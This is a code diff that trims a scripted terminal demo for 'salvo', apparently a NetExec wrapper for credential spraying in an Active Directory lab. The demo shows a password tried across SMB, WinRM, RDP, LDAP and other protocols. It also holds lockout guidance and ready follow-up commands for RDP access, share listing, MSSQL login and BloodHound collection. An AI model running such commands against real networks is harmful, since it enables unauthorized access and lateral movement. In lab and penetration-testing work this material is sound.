@@ -26,41 +26,40 @@ def _d(text):
 
 # ── The opening run ──────────────────────────────────────────────────
 # Real output from `salvo 1.0.0` against the estate below. The terminal
-# replays this as it opens and then hands over the prompt; with no
-# JavaScript it is simply the content of the section.
+# replays this command live as it opens and then hands over the prompt;
+# with no JavaScript it is simply the content of the section.
+#
+# Three hosts rather than the whole /24, because it has to stay short
+# enough to read, and these three carry every verdict the tool can
+# reach: ADMIN and exec on one host, ok, VALID*, the winrm '?', a
+# refusal, and a dead port.
+
+OPENING = "salvo 10.0.0.10 10.0.0.25 10.0.0.31 -u jdoe -p 'Password123!' -d corp.local"
 
 BOOT = _d("""
         [*] salvo 1.0.0  |  nxc 1.5.0-lab
         [!] LOCKOUT MATH - each protocol against each host is a separate logon,
             and a domain account's counter lives on the DC, so every host counts.
-              jdoe                     up to 2048 logons (8 protocol-jobs x 256 hosts)
+              jdoe                     up to 24 logons (8 protocol-jobs x 3 hosts)
             Default AD lockout threshold is often 5. Check it first:
                 nxc smb <DC_IP> -u '' -p '' --pass-pol
             Narrow with -P smb,winrm, or spread it out with --stealth.
 
         [*] 8 nxc process(es), 6 at a time
 
-        [  +  ]  mssql  10.0.0.26        SQL01            jdoe
+        [  +  ]  smb    10.0.0.10        DC01             jdoe
+        [ADMIN]  smb    10.0.0.25        WEB01            jdoe
+        [VALID*] smb    10.0.0.31        FS01             jdoe
         [  +  ]  wmi    10.0.0.10        DC01             jdoe
         [  +  ]  wmi    10.0.0.25        WEB01            jdoe
-        [  +  ]  wmi    10.0.0.26        SQL01            jdoe
         [  +  ]  wmi    10.0.0.31        FS01             jdoe
         [  ?  ]  winrm  10.0.0.10        DC01             jdoe
         [EXEC ]  winrm  10.0.0.25        WEB01            jdoe
-        [  ?  ]  winrm  10.0.0.26        SQL01            jdoe
         [  ?  ]  winrm  10.0.0.31        FS01             jdoe
-        [  -  ]  ssh    10.0.0.42        LNX01            jdoe
-        [  +  ]  smb    10.0.0.10        DC01             jdoe
-        [ADMIN]  smb    10.0.0.25        WEB01            jdoe
-        [  +  ]  smb    10.0.0.26        SQL01            jdoe
-        [VALID*] smb    10.0.0.31        FS01             jdoe
-        [  -  ]  smb    10.0.0.42        LNX01            jdoe
         [  +  ]  ldap   10.0.0.10        DC01             jdoe
-        [  -  ]  ftp    10.0.0.25        WEB01            jdoe
-        [  -  ]  ftp    10.0.0.42        LNX01            jdoe
         [VALID*] rdp    10.0.0.10        DC01             jdoe
         [  +  ]  rdp    10.0.0.25        WEB01            jdoe
-        [  +  ]  rdp    10.0.0.26        SQL01            jdoe
+        [  -  ]  ftp    10.0.0.25        WEB01            jdoe
 
         [*] finished in 0s
 
@@ -71,9 +70,7 @@ BOOT = _d("""
         ---------------------------------------------------------------------------------
         10.0.0.10 (DC01)       ok       ?      ok       -      ok  VALID*       -       - <
         10.0.0.25 (WEB01)   ADMIN    exec      ok       -       -      ok       -       . <
-        10.0.0.26 (SQL01)      ok       ?      ok      ok       -      ok       -       - <
         10.0.0.31 (FS01)   VALID*       ?      ok       -       -       -       -       - <
-        10.0.0.42 (LNX01)       .       -       -       -       -       -       .       .
 
           ADMIN  = provably administrative (smb admin-share write, mssql sysadmin)
           exec   = code execution, NOT admin - check the smb column before assuming
@@ -86,7 +83,7 @@ BOOT = _d("""
 
 
         AUTHENTICATION ATTEMPTS ACTUALLY MADE (a '-' never reached auth):
-          jdoe                     21
+          jdoe                     13
 
         NOT A VERDICT - these did not fail, they were blocked or unreadable:
           rdp    as jdoe             password correct, account denied this logon type
@@ -94,7 +91,7 @@ BOOT = _d("""
           smb    as jdoe             password correct, account denied this logon type
                  10.0.0.31
           winrm  as jdoe             refused with no status code - on winrm this cannot be told apart from an authorization denial. Do not write the cred off.
-                 10.0.0.10, 10.0.0.26, 10.0.0.31
+                 10.0.0.10, 10.0.0.31
           A credential in this list is still live. Take it to another protocol.
 
         NEXT:
@@ -105,10 +102,6 @@ BOOT = _d("""
               xfreerdp3 /u:jdoe /p:'Password123!' /v:10.0.0.25 /cert:ignore /drive:kali,/home/kali
           10.0.0.10 (DC01)   smb:ok, wmi:ok   [no admin proven on this host]
               nxc smb 10.0.0.10 -u jdoe -p 'Password123!' --shares   # non-admin still reads shares
-          10.0.0.26 (SQL01)   smb:ok, mssql:ok, rdp:ok, wmi:ok   [no admin proven on this host]
-              nxc smb 10.0.0.26 -u jdoe -p 'Password123!' --shares   # non-admin still reads shares
-              impacket-mssqlclient jdoe:'Password123!'@10.0.0.26 -windows-auth
-              xfreerdp3 /u:jdoe /p:'Password123!' /v:10.0.0.26 /cert:ignore /drive:kali,/home/kali   # NOT local admin here - expect to land as a standard user
           10.0.0.31 (FS01)   wmi:ok   [no admin proven on this host]
           domain-wide (LDAP bind works as jdoe)
               nxc ldap 10.0.0.10 -u jdoe -p 'Password123!' --bloodhound -c All --dns-server 10.0.0.10
